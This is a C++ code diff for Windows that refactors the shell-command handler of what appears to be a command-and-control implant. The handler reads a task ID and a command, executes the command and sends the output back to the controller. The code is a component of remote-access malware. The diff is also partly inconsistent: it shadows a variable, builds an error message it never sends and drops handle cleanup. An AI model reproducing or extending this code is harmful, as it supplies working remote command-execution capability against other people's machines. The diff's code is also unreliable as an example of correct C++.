@@ -1,12 +1,12 @@
-#include "Shell.h"
 #include <windows.h>
 #include <string>
 #include <iostream>
 #include <cstdio>
 #include <cstring>
-#include "command.h"
+#include "BaseExec.h"
+#include "WrapExec.h"
 
-BOOL executeShell(PParser arguments)
+BOOL wrapExec(PParser arguments)
 {
     SIZE_T uuidLength = 36;
     PCHAR taskUuid = getString(arguments, &uuidLength);
@@ -21,17 +21,19 @@ BOOL executeShell(PParser arguments)
     addString(responseTask, taskUuid, FALSE);
 
     PPackage output = newPackage(0, FALSE);
+    
+    std::string result;
+    BOOL success = baseExec(cmd, result);
 
-    std::string output;
-    BOOL success = executeCommand(cmd, "", &output);
-
-    addBytes(responseTask, (PBYTE)output->buffer, output->length, TRUE);
-
-    // Clean up
-    CloseHandle(hStdOutRead);
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    if (!success)
+    {
+        char result[256];
+        snprintf(result, sizeof(result), "[CD] Error executing command => %s !\n", cmd);
+        addString(output, result, FALSE);
+        return FALSE;
+    }
+    
+    addBytes(responseTask, (PBYTE)result.c_str(), result.length(), TRUE);
 
     Parser *ResponseParser = sendPackage(responseTask);
 
